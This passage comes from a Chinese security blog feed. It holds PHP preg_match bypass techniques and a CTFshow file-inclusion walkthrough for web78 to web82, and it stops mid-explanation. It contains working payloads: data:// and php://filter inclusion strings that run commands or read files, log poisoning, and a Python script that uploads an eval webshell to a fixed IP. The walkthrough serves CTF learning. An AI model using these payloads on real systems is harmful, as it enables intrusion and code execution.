double-quoted-string\">\"a\na\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/./m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215829517.png\" alt=\"image-20221108215829517\" /></p>\n<h3 id=\"运算符优先级\"><a class=\"anchor\" href=\"#运算符优先级\">#</a> 运算符优先级</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">运算符</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">\\</td>\n<td style=\"text-align:left\">转义符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">(), (?😃, (?=), []</td>\n<td style=\"text-align:left\">圆括号和方括号</td>\n</tr>\n<tr>\n<td style=\"text-align:left\" n,m=\"\">*, +, ?, {n}, {n,},</td>\n<td style=\"text-align:left\">限定符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">^, $, \\ 任何元字符、任何字符</td>\n<td style=\"text-align:left\">定位点和序列（即：位置和顺序）</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">|</td>\n<td style=\"text-align:left\">替换，&quot;或&quot; 操作 字符具有高于替换运算符的优先级，使得 &quot;m|food&quot; 匹配 &quot;m&quot; 或 &quot;food&quot;。若要匹配 &quot;mood&quot; 或 &quot;food&quot;，请使用括号创建子表达式，从而产生 &quot;(m|f) ood&quot;。</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td style=\"text-align:left\">这里分享一个小工具，好评 [正则表达式在线测试</td>\n<td style=\"text-align:left\">菜鸟工具 (<span class=\"exturl\" data-url=\"aHR0cDovL3J1bm9vYi5jb20=\">runoob.com</span>)](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jLnJ1bm9vYi5jb20vZnJvbnQtZW5kLzg1NC8=\">https://c.runoob.com/front-end/854/</span>)</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"preg_match绕过\"><a class=\"anchor\" href=\"#preg_match绕过\">#</a> preg_match 绕过</h3>\n<p>正则扯了这么久，现在来说说这个万恶的 preg_match 怎么绕过</p>\n<h4 id=\"数组绕过\"><a class=\"anchor\" href=\"#数组绕过\">#</a> 数组绕过</h4>\n<p>preg_match 只能处理字符串，当传入的 subject 是数组时会返回 false</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>@<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/./m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Match found\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"换行绕过\"><a class=\"anchor\" href=\"#换行绕过\">#</a> 换行绕过</h4>\n<p>上面测试也有提到，当 ^$ 同时存在且不是 m 模式的情况下，有换行返回空，且点不会匹配换行</p>\n<p>因此面对下面的情况中就能通过换行来绕过正则</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9]+$/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NG\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这里遇到换行匹配不到</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;123%0a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108222815571.png\" alt=\"image-20221108222815571\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;%0a123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108222700947.png\" alt=\"image-20221108222700947\" /></p>\n<h4 id=\"回溯次数限制\"><a class=\"anchor\" href=\"#回溯次数限制\">#</a> 回溯次数限制</h4>\n<p>这里拜读 p 牛的文章<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\"> PHP 利用 PCRE 回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</span></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/&lt;\\?.*[(`;?>].*/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NG\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>对于 demo 中的正则表达式</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span>\\<span class=\"token operator\">?</span><span class=\"token operator\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>`<span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span>is<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>假设传入 &lt;?php phpinfo ();//aaaaa</p>\n<p>传入正则后.* 匹配全部的字符，但是</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">[(&#96;;?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>没有匹配到东西，于是会吐出一个 a，还是匹配不上，一直回溯到 phpinfo () 后面的；，停止回溯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108223613099.png\" alt=\"image-20221108223613099\" /></p>\n<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 <code>pcre.backtrack_limit</code> 。我们可以通过 <code>var_dump(ini_get('pcre.backtrack_limit'));</code>  的方式查看当前环境下的上限</p>\n<p>可见，回溯次数上限默认是 100 万。如果我们回溯超过 100 万次 preg_match 就会返回 false</p>\n<p>大佬的 payload</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO\n\nfiles <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'aaa&lt;?php eval($_POST[txt]);//'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\nres <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://51.158.75.42:8088/index.php'</span><span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">,</span> allow_redirects<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<hr class=\"footnotes-sep\" />\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>0-9 <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "Web",
                "正则表达式"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://blog.xcu.icu/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "CTFshow-web入门文件包含",
            "date_published": "2022-11-05T04:00:00.000Z",
            "content_html": "<h2 id=\"web78\"><a class=\"anchor\" href=\"#web78\">#</a> web78</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>data：</p>\n<p>从 PHP5.2.0 起，数据封装流就开始有效，用于数据流的读取。<br />\n如果传入的都是 PHP 代码，就会执行任意代码</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104100708562.png\" alt=\"image-20221104100708562\" /></p>\n<p>php://filter 是元封装器，设计用于数据流打开时筛选过滤应用，对本地磁盘文件进行读写</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104101156551.png\" alt=\"image-20221104101156551\" /></p>\n<h2 id=\"web79\"><a class=\"anchor\" href=\"#web79\">#</a> web79</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payload:</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;&#96;cat flag.php&#96;?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>这里还是使用 data，因为过滤了 php 所以这里使用短标签</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?&#x3D; ?&gt;等同于&lt;?php echo ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104140318246.png\" alt=\"image-20221104140318246\" /></p>\n<p>这里的第一行仅起屏蔽报错的作用，为了方便展示加上的，没有也能正常输出</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104140448180.png\" alt=\"image-20221104140448180\" /></p>\n<h2 id=\"web80\"><a class=\"anchor\" href=\"#web80\">#</a> web80</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>对着干了属于是，这里将能用的伪协议给都替换了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104142025489.png\" alt=\"image-20221104142025489\" /></p>\n<p>这里看到是 nginx 服务器，nginx 有两个日志文件，一个 access.log 用来记录每次成功的请求信息，包括 IP 地址，时间，浏览器等信息，一个 error.log 记录异常信息</p>\n<p>ua 头也会在 access 文件中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104143220895.png\" alt=\"image-20221104143220895\" /></p>\n<p>看到 flag 应该在 fl0g.php 中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104141907175.png\" alt=\"image-20221104141907175\" /></p>\n<h2 id=\"web81\"><a class=\"anchor\" href=\"#web81\">#</a> web81</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>多 ban 了一个:emmmm 似乎没啥用？因为这个难度应该是一层一层增加的才是，那么这个：到底增加在哪呢？再回去看看 80 题</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>这里替换，我反复斟酌后发现我没有考虑到最简单的办法，大小写绕过，回去试试</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104150442557.png\" alt=\"image-20221104150442557\" /></p>\n<p>读取 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104150510196.png\" alt=\"image-20221104150510196\" /></p>\n<p>那这一题用上一题的方法就行了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104150930071.png\" alt=\"image-20221104150930071\" /></p>\n<p>flag 没换地方，冲</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104151028431.png\" alt=\"image-20221104151028431\" /></p>\n<h2 id=\"web82\"><a class=\"anchor\" href=\"#web82\">#</a> web82</h2>\n<p>因为环境问题，这几个到晚上才补上</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这里前面的利用方式都给过滤的差不多了，可以使用 session.upload_progress 文件来文件包含，首先来聊一聊下面这几个 php.ini 中的配置</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">1. session.upload_progress.enabled &#x3D; on\n2. session.upload_progress.cleanup &#x3D; on\n3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;\n4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>第一个，为 on 表示 upload_progress 功能开启，即上传文件时会将文件的详细信息，上传进度存入 session 中</p>\n<p>第二个，为 on 表示再会话结束后会将文件中的内容清空处理</p>\n<p>第三个，session.upload_progress.prefix，设置上传文件内容的前缀</p>\n<p>第四个，session.upload_progress.name 的值即为 session 中的键值</p>\n<p>了解过这几个重要的配置文件后，我们说一说怎么利用</p>\n<p>php.ini 中 <code>session.use_strict_mode</code>  选项默认是 0，也就意味着我们可以自定义 SESSIONID，着有什么用呢？</p>\n<p>在 Linux 中 session 的默认储存位置一般有下面四个</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>用户在 cookie 中设置 